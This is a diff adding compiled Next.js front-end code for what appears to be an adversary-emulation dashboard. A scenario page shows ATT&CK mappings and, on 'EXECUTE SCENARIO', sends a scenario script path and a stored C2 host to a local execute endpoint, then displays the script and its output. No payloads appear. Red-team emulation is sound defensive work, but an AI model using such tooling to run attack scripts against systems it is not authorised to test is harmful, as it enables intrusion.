+                        }, void 0, false, {
+                            fileName: "[project]/src/components/Console.tsx",
+                            lineNumber: 35,
+                            columnNumber: 25
+                        }, this)
+                    }, void 0, false, {
+                        fileName: "[project]/src/components/Console.tsx",
+                        lineNumber: 34,
+                        columnNumber: 21
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                        ref: bottomRef
+                    }, void 0, false, {
+                        fileName: "[project]/src/components/Console.tsx",
+                        lineNumber: 38,
+                        columnNumber: 17
+                    }, this)
+                ]
+            }, void 0, true, {
+                fileName: "[project]/src/components/Console.tsx",
+                lineNumber: 26,
+                columnNumber: 13
+            }, this)
+        ]
+    }, void 0, true, {
+        fileName: "[project]/src/components/Console.tsx",
+        lineNumber: 19,
+        columnNumber: 9
+    }, this);
+}
+_s(Console, "eaUWg0io6wE0buoFSqU1QLjVsUo=");
+_c = Console;
+var _c;
+__turbopack_context__.k.register(_c, "Console");
+if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
+    __turbopack_context__.k.registerExports(__turbopack_context__.m, globalThis.$RefreshHelpers$);
+}
+}),
+"[project]/src/app/scenario/[id]/Scenario.module.css [app-client] (css module)", ((__turbopack_context__) => {
+
+__turbopack_context__.v({
+  "backLink": "Scenario-module__OWz1pW__backLink",
+  "container": "Scenario-module__OWz1pW__container",
+  "controls": "Scenario-module__OWz1pW__controls",
+  "header": "Scenario-module__OWz1pW__header",
+  "meta": "Scenario-module__OWz1pW__meta",
+  "mitreSection": "Scenario-module__OWz1pW__mitreSection",
+  "title": "Scenario-module__OWz1pW__title",
+});
+}),
+"[project]/src/app/scenario/[id]/page.tsx [app-client] (ecmascript)", ((__turbopack_context__) => {
+"use strict";
+
+__turbopack_context__.s([
+    "default",
+    ()=>ScenarioPage
+]);
+var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/compiled/react/jsx-dev-runtime.js [app-client] (ecmascript)");
+var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/compiled/react/index.js [app-client] (ecmascript)");
+var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$client$2f$app$2d$dir$2f$link$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/client/app-dir/link.js [app-client] (ecmascript)");
+var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$navigation$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/navigation.js [app-client] (ecmascript)");
+var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/types.ts [app-client] (ecmascript)");
+var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/components/Console.tsx [app-client] (ecmascript)");
+var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$scenario$2f5b$id$5d2f$Scenario$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__ = __turbopack_context__.i("[project]/src/app/scenario/[id]/Scenario.module.css [app-client] (css module)");
+;
+var _s = __turbopack_context__.k.signature();
+'use client';
+;
+;
+;
+;
+;
+;
+function ScenarioPage({ params }) {
+    _s();
+    const { id } = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["use"])(params);
+    const scenario = __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["SCENARIOS"].find((s)=>s.id === id);
+    const [isRunning, setIsRunning] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])(false);
+    const [logs, setLogs] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useState"])([]);
+    if (!scenario) {
+        (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$navigation$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["notFound"])();
+    }
+    const handleExecute = async ()=>{
+        setIsRunning(true);
+        const c2Host = localStorage.getItem('c2_host');
+        if (!c2Host) {
+            setLogs((prev)=>[
+                    ...prev,
+                    '[!] WARNING: No C2 Server set. Please configure in header.'
+                ]);
+        }
+        setLogs((prev)=>[
+                ...prev,
+                `[INFO] Initializing ${scenario.name}...`,
+                `[INFO] Adversary Infrastructure: ${c2Host || 'Unknown'}`
+            ]);
+        try {
+            const response = await fetch('/api/execute', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    scriptPath: scenario.scriptPath,
+                    c2Host: c2Host
+                })
+            });
+            const data = await response.json();
+            if (data.success) {
+                const logsToAdd = [];
+                if (data.scriptContent) {
+                    logsToAdd.push('[*] SCRIPT CONTENT EXECUTION PLAN:', '----------------------------------------');
+                    logsToAdd.push(...data.scriptContent.split('\n'));
+                    logsToAdd.push('----------------------------------------');
+                }
+                const lines = data.output.split('\n').filter((l)=>l);
+                logsToAdd.push(...lines, '[+] Execution Completed Successfully.');
+                setLogs((prev)=>[
+                        ...prev,
+                        ...logsToAdd
+                    ]);
+            } else {
+                setLogs((prev)=>[
+                        ...prev,
+                        `[ERROR] ${data.error}`
+                    ]);
+            }
+        } catch (error) {
+            setLogs((prev)=>[
+                    ...prev,
+                    `[ERROR] Execution failed: ${error}`
+                ]);
+        } finally{
+            setIsRunning(false);
+        }
+    };
+    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("main", {
+        className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$scenario$2f5b$id$5d2f$Scenario$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].container,
+        style: {
+            animation: 'fadeIn 0.3s ease'
+        },
+        children: [
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$client$2f$app$2d$dir$2f$link$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["default"], {
+                href: "/",
+                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$scenario$2f5b$id$5d2f$Scenario$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].backLink,
+                children: "← Back to Dashboard"
+            }, void 0, false, {
+                fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                lineNumber: 67,
+                columnNumber: 13
+            }, this),
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("header", {
+                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$scenario$2f5b$id$5d2f$Scenario$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].header,
+                children: [
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                        className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$scenario$2f5b$id$5d2f$Scenario$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].meta,
+                        children: [
+                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                className: "badge",
+                                style: {
+                                    color: 'var(--secondary)',
+                                    borderColor: 'var(--secondary)'
+                                },
+                                children: [
+                                    "[",
+                                    scenario.adversary,
+                                    "]"
+                                ]
+                            }, void 0, true, {
+                                fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                                lineNumber: 71,
+                                columnNumber: 21
+                            }, this),
+                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                className: "mono text-dim",
+                                children: scenario.difficulty
+                            }, void 0, false, {
+                                fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                                lineNumber: 72,
+                                columnNumber: 21
+                            }, this),
+                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                className: "mono text-dim",
+                                children: scenario.estimatedDuration
+                            }, void 0, false, {
+                                fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                                lineNumber: 73,
+                                columnNumber: 21
+                            }, this)
+                        ]
+                    }, void 0, true, {
+                        fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                        lineNumber: 70,
+                        columnNumber: 17
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h1", {
+                        className: "mono text-primary glow-text",
+                        style: {
+                            fontSize: '2rem',
+                            marginBottom: '0.5rem'
+                        },
+                        children: scenario.name
+                    }, void 0, false, {
+                        fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                        lineNumber: 75,
+                        columnNumber: 17
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
+                        className: "text-dim",
+                        children: scenario.description
+                    }, void 0, false, {
+                        fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                        lineNumber: 76,
+                        columnNumber: 17
+                    }, this)
+                ]
+            }, void 0, true, {
+                fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                lineNumber: 69,
+                columnNumber: 13
+            }, this),
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("section", {
+                className: "section-card",
+                style: {
+                    marginBottom: '2rem'
+                },
+                children: [
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h3", {
+                        children: "MITRE ATT&CK MAPPING"
+                    }, void 0, false, {
+                        fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                        lineNumber: 80,
+                        columnNumber: 17
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                        style: {
+                            display: 'grid',
+                            gap: '0.5rem'
+                        },
+                        children: scenario.mitreTechniques.map((t)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                                className: "accent-item",
+                                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("a", {
+                                    href: t.url,
+                                    target: "_blank",
+                                    rel: "noopener noreferrer",
+                                    className: "mono",
+                                    style: {
+                                        color: 'var(--text-main)',
+                                        textDecoration: 'none'
+                                    },
+                                    children: [
+                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                            className: "text-primary",
+                                            style: {
+                                                marginRight: '0.5rem'
+                                            },
+                                            children: t.id
+                                        }, void 0, false, {
+                                            fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                                            lineNumber: 86,
+                                            columnNumber: 33
+                                        }, this),
+                                        t.name
+                                    ]
+                                }, void 0, true, {
+                                    fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                                    lineNumber: 84,
+                                    columnNumber: 29
+                                }, this)
+                            }, t.id, false, {
+                                fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                                lineNumber: 83,
+                                columnNumber: 25
+                            }, this))
+                    }, void 0, false, {
+                        fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                        lineNumber: 81,
+                        columnNumber: 17
+                    }, this)
+                ]
+            }, void 0, true, {
+                fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                lineNumber: 79,
+                columnNumber: 13
+            }, this),
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$scenario$2f5b$id$5d2f$Scenario$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].controls,
+                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
+                    className: "btn",
+                    onClick: handleExecute,
+                    disabled: isRunning,
+                    style: {
+                        opacity: isRunning ? 0.5 : 1
+                    },
+                    children: isRunning ? 'EXECUTING...' : 'EXECUTE SCENARIO'
+                }, void 0, false, {
+                    fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                    lineNumber: 95,
+                    columnNumber: 17
+                }, this)
+            }, void 0, false, {
+                fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                lineNumber: 94,
+                columnNumber: 13
+            }, this),
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$tsx__$5b$app$2d$client$5d$__$28$ecmascript$29$__["default"], {
+                logs: logs,
+                isRunning: isRunning
+            }, void 0, false, {
+                fileName: "[project]/src/app/scenario/[id]/page.tsx",
+                lineNumber: 105,
+                columnNumber: 13
+            }, this)
+        ]
+    }, void 0, true, {
+        fileName: "[project]/src/app/scenario/[id]/page.tsx",
+        lineNumber: 66,
+        columnNumber: 9
+    }, this);
+}
+_s(ScenarioPage, "9AGmvl7m3qFbPSrgVl6wn/1y7Yg=");
+_c = ScenarioPage;
+var _c;
+__turbopack_context__.k.register(_c, "ScenarioPage");
+if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
+    __turbopack_context__.k.registerExports(__turbopack_context__.m, globalThis.$RefreshHelpers$);
+}
+}),
+]);
+
+//# sourceMappingURL=src_22d01330._.js.map
